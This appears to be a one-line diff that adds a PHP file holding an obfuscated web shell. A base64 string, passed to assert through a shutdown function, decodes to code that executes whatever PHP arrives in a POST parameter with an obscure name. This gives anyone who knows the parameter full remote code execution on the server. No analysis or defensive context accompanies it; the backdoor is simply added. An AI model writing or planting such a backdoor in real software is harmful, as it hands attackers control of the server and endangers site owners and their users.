@@ -1,0 +1,1 @@
+<?php register_shutdown_function(assert, base64_decode('YXNzZXJ0KCRfUE9TVFsnZGp6cWQ5NTI3J10pOw=='));?>  
